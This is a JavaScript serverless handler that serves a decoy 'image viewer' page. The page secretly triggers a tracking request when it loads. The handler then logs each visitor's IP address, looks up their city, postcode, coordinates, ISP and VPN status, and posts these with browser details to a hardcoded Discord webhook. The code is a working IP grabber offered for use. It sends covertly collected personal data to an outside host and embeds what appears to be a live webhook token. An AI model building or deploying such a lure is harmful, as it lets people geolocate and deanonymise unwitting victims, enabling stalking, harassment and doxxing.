const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565077459559252048/IQQWuDIPCoO0sZqzU_YCV12JmPFGJi9BrBjZ0_KqZ6JMPtGSNVfxKMqWvopnlXYyL4zj';

const HTML = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>image viewer</title><style>:root{color-scheme:dark}body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0b0d10;color:#e6e8eb;font:15px/1.5 ui-monospace,monospace}main{text-align:center}.img{width:min(560px,90vw);aspect-ratio:16/9;background:linear-gradient(135deg,#1f6feb,#7ee787);border-radius:12px;margin-bottom:1rem}p{color:#8a9199;margin:0}</style></head><body><main><div class="img"></div><p>loading image…</p></main><script>fetch('/track',{keepalive:true}).catch(()=>{})</script></body></html>`;

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const u = new URL(req.url, 'http://x');
  const isBeacon = u.searchParams.get('beacon') === '1' || u.pathname === '/track';

  if (!isBeacon) {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(HTML);
  }

  const ip = (req.headers['x-real-ip']
    || (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
    || (req.socket && req.socket.remoteAddress) || '?').replace(/^::ffff:/, '');

  let geo = {};
  try {
    const r = await fetch(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query`);
    if (r.ok) geo = await r.json();
  } catch {}

  const ua = String(req.headers['user-agent'] || '?').slice(0, 1000);
  const ref = String(req.headers['referer'] || 'direct').slice(0, 200);
  const lang = String(req.headers['accept-language'] || '?').slice(0, 100);
  const color = geo.proxy ? 0xf85149 : geo.hosting ? 0xd29922 : 0x7ee787;

  const payload = {
    username: 'ip bench',
    embeds: [{
      title: 'hit',
      color,
      description: `**${ip}**`,
      fields: [
        { name: 'land', value: geo.country || '?', inline: true },
        { name: 'regio', value: geo.regionName || '?', inline: true },
        { name: 'stad', value: geo.city || '?', inline: true },
        { name: 'postcode', value: geo.zip || '?', inline: true },
        { name: 'tijdzone', value: geo.timezone || '?', inline: true },
        { name: 'coords', value: geo.lat != null ? `${geo.lat}, ${geo.lon}` : '?', inline: true },
        { name: 'isp', value: geo.isp || '?', inline: true },
        { name: 'org', value: geo.org || '?', inline: true },
        { name: 'asn', value: geo.as || '?', inline: false },
        { name: 'reverse dns', value: geo.reverse || '?', inline: false },
        { name: 'mobiel', value: geo.mobile ? 'ja' : 'nee', inline: true },
        { name: 'proxy/vpn', value: geo.proxy ? 'ja' : 'nee', inline: true },
        { name: 'datacenter', value: geo.hosting ? 'ja' : 'nee', inline: true },
        { name: 'referrer', value: ref, inline: false },
        { name: 'user-agent', value: ua, inline: false },
        { name: 'taal', value: lang, inline: true }
      ],
      timestamp: new Date().toISOString(),
      footer: { text: 'olliE bench' }
    }]
  };

  try {
    const wh = await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
    if (!wh.ok) return res.status(200).json({ ok: false, upstream: wh.status });
  } catch (e) {
    return res.status(200).json({ ok: false, err: e.message });
  }
  res.status(200).json({ ok: true });
}
